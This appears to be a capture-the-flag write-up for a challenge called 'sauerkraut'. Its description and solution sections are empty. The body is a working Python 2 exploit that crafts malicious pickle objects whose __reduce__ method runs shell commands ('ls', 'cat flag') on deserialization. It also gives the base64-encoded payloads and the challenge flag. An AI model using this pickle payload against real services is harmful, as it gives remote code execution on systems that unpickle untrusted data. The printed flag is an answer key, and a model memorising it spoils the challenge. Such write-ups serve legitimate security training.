# sauerkraut

## Challenge

## Solution

## Exploit

```py
#!/usr/bin/env python2

import cPickle
import subprocess
import base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, ('ls', ))

print "ls:"
print base64.b64encode(cPickle.dumps(Exploit()))

print ""

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat','flag'], ))

print "cat flag:"
print base64.b64encode(cPickle.dumps(Exploit()))
```

```
ls:
Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCihTJ2xzJwpwMgp0cDMKUnA0Ci4=

cat flag:
Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCigobHAyClMnY2F0JwpwMwphUydmbGFnJwpwNAphdFJwNQou
```

## Flag

`SNYK{6854ecb17f51afdf2610f741dd07bd6099c616e4ab1a403eb14fa8639e1fb0af}`

